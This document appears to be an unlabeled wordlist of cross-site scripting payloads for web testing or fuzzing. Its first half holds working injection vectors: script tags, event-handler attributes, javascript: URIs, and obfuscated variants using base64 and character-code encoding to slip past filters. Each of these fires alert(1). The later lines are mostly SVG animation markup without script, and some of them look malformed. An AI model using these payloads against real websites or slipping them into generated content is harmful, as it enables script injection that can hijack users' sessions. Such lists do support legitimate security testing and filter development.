<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<marquee onstart=alert(1)>
<details ontoggle=alert(1)>
<svg><script>alert(1)</script></svg>
<img src=1 onerror=alert(1)>
<img src='1' onerror='alert(1)'>
<img src="1" onerror="alert(1)">
<div onmouseover="alert(1)">Hover me</div>
<input onfocus=alert(1) autofocus>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<math><mtext><div onmouseover='alert(1)'>
<form><button formaction=javascript:alert(1)>
<isindex type=image src=1 onerror=alert(1)>
<object data=javascript:alert(1)>
<svg><script xlink:href=,alert(1)></script></svg>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>Click me</a>
<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=1 onerror=this.src='javascript:alert(1)'>
<img src=1 onerror=location='javascript:alert(1)'>
<img src=1 onerror=import('javascript:alert(1)')>
<img src=1 onerror=fetch('javascript:alert(1)')>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x attributetype=xml dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><set onend=alert(1) attributename=x attributetype=xml dur=1s>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatcount=2>
<svg><set onrepeat=alert(1) attributename=x attributetype=xml dur=1s repeatcount=2>
<svg><a><circle r=40 fill=red><animate attributeName=fill values=blue;red;green dur=1s repeatcount=indefinite></a>
<svg><a><rect width=100 height=100><animate attributeName=width values=0;100;0 dur=1s repeatcount=indefinite></a>
<svg><a><ellipse rx=10 ry=10><animate attributeName=rx values=0;10;0 dur=1s repeatcount=indefinite></a>
<svg><a><line x1=0 y1=0 x2=100 y2=100><animate attributeName=x1 values=0;100;0 dur=1s repeatcount=indefinite></a>
<svg><a><polyline points=0,0 0,100 100,100 100,0><animate attributeName=points values='0,0 0,100 100,100 100,0';'50,50 50,150 150,150 150,50' dur=1s repeatcount=indefinite></a>
<svg><a><polygon points=0,0 0,100 100,100 100,0><animate attributeName=points values='0,0 0,100 100,100 100,0';'50,50 50,150 150,150 150,50' dur=1s repeatcount=indefinite></a>
<svg><a><path d=M0,0 L0,100 L100,100 L100,0 Z><animate attributeName=d values='M0,0 L0,100 L100,100 L100,0 Z';'M50,50 L50,150 L150,150 L150,50 Z' dur=1s repeatcount=indefinite></a>
<svg><a><text x=20 y=20>Hello</text><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><tspan x=20 y=20>Hello</tspan><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><tref xlink:href=#text><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><textpath xlink:href=#path><tspan>Hello</tspan></textpath><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><altglyph><tspan>Hello</tspan></altglyph><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><textareatext><tspan>Hello</tspan></textareatext><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><foreignobject><tspan>Hello</tspan></foreignobject><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><switch><tspan>Hello</tspan></switch><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><symbol><tspan>Hello</tspan></symbol><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><use><tspan>Hello</tspan></use><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><image><tspan>Hello</tspan></image><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><cursor><tspan>Hello</tspan></cursor><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><font><tspan>Hello</tspan></font><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><font-face><tspan>Hello</tspan></font-face><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
